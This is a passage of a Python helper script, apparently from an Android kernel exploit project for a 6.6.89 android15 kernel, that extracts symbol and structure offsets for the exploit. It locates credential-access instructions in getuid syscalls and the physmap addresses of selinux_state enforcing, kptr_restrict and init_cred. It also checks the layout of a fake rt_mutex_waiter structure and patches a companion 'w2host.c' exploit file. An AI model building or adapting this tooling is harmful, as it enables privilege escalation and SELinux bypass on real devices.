    def find_window(fn_va, fn_name):
        off = fn_va - base
        if off < 0 or off + 96 > len(kern):
            return None
        insns = list(md.disasm(kern[off:off + 96], fn_va))
        ldr_idx = None
        for i, ins in enumerate(insns):
            if ins.mnemonic == "ldr" and ins.op_str.startswith("x8, [") and \
                    ("#%#x" % task_cred_off) in ins.op_str:
                ldr_idx = i
                break
        if ldr_idx is None:
            return None
        win = []
        for ins in insns[ldr_idx + 1:]:
            if ins.mnemonic == "ret":
                break
            writes = len(ins.operands) > 0 and ins.operands[0].type == 1 and \
                ins.reg_name(ins.operands[0].reg) in ("x8", "w8")
            if writes:
                break
            win.append(ins.address - fn_va)
        return win

    sym_off = {}
    for w in RUNTIME_SYMBOLS:
        if w[0] in syms:
            # 兼容旧键名: __dump_skip.zeroes -> zeroes_buf (PS1 依赖)
            key = "zeroes_buf" if w[0] == "__dump_skip.zeroes" else w[0]
            sym_off[key] = syms[w[0]] - base
    win = {}
    for fn in ("__arm64_sys_getuid", "__arm64_sys_geteuid", "__arm64_sys_getresuid"):
        if fn in syms:
            w = find_window(syms[fn], fn)
            if w:
                win[fn] = [syms[fn] - base] + w
    cred_ips = sorted(set(win[fn][0] + wo for fn in win for wo in win[fn][1:]))
    out = {
        "physmap_base": "0xffffff8000000000",
        "elf": elf_path,
        "kimage_text_base": "0x%x" % base,
        "sym_offs": {k: hex(v) for k, v in sym_off.items()},
        "w2host": {
            "cred_ip_offs": [hex(x) for x in cred_ips],
            "win_lo": hex(min(cred_ips) - 0x200) if cred_ips else "0x0",
            "win_hi": hex(max(cred_ips) + 0x200) if cred_ips else "0x0",
        },
    }
    json.dump(out, open(out_path, "w"), indent=2)
    print("winoffs saved:", out_path)
    return out


# ============================================================
# 7. live 模式 (兼容: STAGE3.4 运行时动态值)
# ============================================================

def gen_live(ks_path, btf_path, win_path, out_path):
    syms, stype, sym_all = parse_kallsyms(ks_path)
    types = parse_btf_full(btf_path)
    win = json.load(open(win_path))
    base = syms.get("_text")
    if not base:
        print("FATAL: no _text")
        sys.exit(1)
    pmb = int(win["physmap_base"], 16)

    cred_cap_perm = task_cred = task_comm = se_enf = None
    for t in types[1:]:
        if t["kind"] == 4:
            if t["name"] == "cred" and cred_cap_perm is None:
                cred_cap_perm = btf_member(types, t, "cap_permitted")
            elif t["name"] == "task_struct":
                task_cred = btf_member(types, t, "cred")
                task_comm = btf_member(types, t, "comm")
            elif t["name"] == "selinux_state":
                se_enf = btf_member(types, t, "enforcing")

    def caps_ok(v):
        return (v >> 16) & 1

    def caps_score(v):
        return sum(1 for b in (1, 12, 19, 21) if (v >> b) & 1)

    img_end = base + 0x4000000
    cands = []
    for s, addrs in sym_all.items():
        if s.endswith(".__key") and stype.get(s) in ("b", "B"):
            for a in addrs:
                if base <= a < img_end and caps_ok(a):
                    cands.append((caps_score(a), a, s))
    cands.sort(key=lambda t: (0 if t[2] == "init_completion.__key" else 1,
                              -t[0], t[1]))
    capsym_va = cands[0][1] if cands else base
    if cands:
        print("capsym: %s @ %#x (score %d)" % (cands[0][2], cands[0][1], cands[0][0]))
    else:
        print("WARN: no capsym candidate")

    so = win["sym_offs"]
    se_p0 = pmb + int(so["selinux_state"], 16)
    kptr_p0 = pmb + int(so["kptr_restrict"], 16)
    o = {
        "generated": "offsets_auto.py (win_offs 权威)",
        "kernel": "6.6.89-android15-8-gb57af212129c (auto)",
        "base_va": hex(base),
        "selinux_enforcing_p0": hex(se_p0),
        "kptr_restrict_p0": hex(kptr_p0),
        "init_cred_p0": hex(pmb + int(so["init_cred"], 16)),
        "init_user_ns_p0": hex(pmb + int(so["init_user_ns"], 16)),
        "capsym_va": hex(capsym_va),
        "struct_offsets": {
            "cred_cap_permitted": cred_cap_perm,
            "task_cred": task_cred,
            "task_comm": task_comm,
            "selinux_enforcing": se_enf,
        },
        "w2host": win["w2host"],
    }
    json.dump(o, open(out_path, "w"), indent=2)
    print(json.dumps(o, indent=2))


# ============================================================
# 8. main
# ============================================================

def main():
    argv = sys.argv[1:]
    if not argv:
        print(__doc__)
        sys.exit(1)
    cmd = argv[0]
    if cmd not in ("live", "header", "winoffs", "all"):
        # 兼容旧版: 4 个位置参数 = live
        gen_live(*argv[:4])
        return

    if cmd == "live":
        gen_live(argv[1], argv[2], argv[3], argv[4])
        return

    if cmd == "winoffs":
        elf = argv[1]
        out = argv[2]
        tco = 0x820
        if "--task-cred-off" in argv:
            tco = int(argv[argv.index("--task-cred-off") + 1], 16)
        gen_winoffs(elf, tco, out)
        return

    if cmd in ("header", "all"):
        ks, btf = argv[1], argv[2]
        out_h = None
        w2host = None
        diff_h = None
        rest = argv[3:]
        if "-o" in rest:
            out_h = rest[rest.index("-o") + 1]
        if "--w2host" in rest:
            w2host = rest[rest.index("--w2host") + 1]
        if "--diff" in rest:
            diff_h = rest[rest.index("--diff") + 1]
        if cmd == "all":
            # all <kallsyms> <btf> <elf> <outdir>
            elf = argv[3]
            outdir = argv[4]
            os.makedirs(outdir, exist_ok=True)
            out_h = os.path.join(outdir, "target_x200.h")
            winoffs_out = os.path.join(outdir, "win_offs.json")
            gen_winoffs(elf, 0x820, winoffs_out)
            gen_live(ks, btf, winoffs_out, os.path.join(outdir, "offsets.json"))

        syms, stype, sym_all = parse_kallsyms(ks)
        types = parse_btf_full(btf)
        sym_off, missing_sym, runtime, base = extract_symbols(syms, stype, sym_all)
        btf_off, missing_btf, extra = extract_btf(types)
        missing = missing_sym + missing_btf

        hdr = gen_header(sym_off, btf_off, {
            "ts": __import__("datetime").datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "extra": os.path.basename(ks) + " + " + os.path.basename(btf),
            "kimage_base": "0xffffffc080000000",
        })

        # 对比旧头文件 (按数值比较, 忽略进制/前导零格式差异)
        if diff_h and os.path.exists(diff_h):
            old = open(diff_h, encoding="utf-8").read()
            old_defs = {k: int(v, 0) for k, v in
                        re.findall(r"#define\s+(\w+_OFF)\s+(0x[0-9a-fA-F]+|\d+)", old)}
            new_defs = {k: int(v, 0) for k, v in
                        re.findall(r"#define\s+(\w+_OFF)\s+(0x[0-9a-fA-F]+|\d+)", hdr)}
            diffs = []
            for k in sorted(set(old_defs) | set(new_defs)):
                o, n = old_defs.get(k), new_defs.get(k)
                if o != n:
                    diffs.append((k, o, n))
            print("=== 与旧头文件对比 (值比较) ===")
            if diffs:
                for k, o, n in diffs:
                    print("  DIFF %-36s 0x%x -> 0x%x" % (k, o if o is not None else 0,
                                                         n if n is not None else 0))
            else:
                print("  ALL MATCH (无差异)")

        if missing:
            print("WARN: 以下必需偏移未提取到 (生成仍继续, 但请勿用于实机):")
            for define, what in missing:
                print("  %-36s %s" % (define, what))

        if out_h:
            open(out_h, "w", encoding="utf-8", newline="").write(hdr)
            print("header saved:", out_h)
        else:
            print(hdr)

        # 校验 FAKE_WAITER_* 与真实 rt_mutex_waiter 一致性
        rtw = extra.get("rt_mutex_waiter")
        if rtw:
            fake_map = {"pi_tree": "FAKE_WAITER_PI_TREE_ENTRY_OFF",
                        "task": "FAKE_WAITER_TASK_OFF",
                        "lock": "FAKE_WAITER_LOCK_OFF",
                        "wake_state": "FAKE_WAITER_WAKE_STATE_OFF",
                        "ww_ctx": "FAKE_WAITER_WW_CTX_OFF"}
            for fld, define in fake_map.items():
                if fld in rtw:
                    print("  check %s: BTF=%#x (fake 布局应与真实一致)" % (
                        define, rtw[fld]))

        # 同步 w2host.c
        if w2host and os.path.exists(w2host):
            changed = patch_w2host(w2host, btf_off)
            if changed:
                print("w2host.c 已同步:", changed)
            else:
                print("w2host.c: 无需修改")


if __name__ == "__main__":
    main()
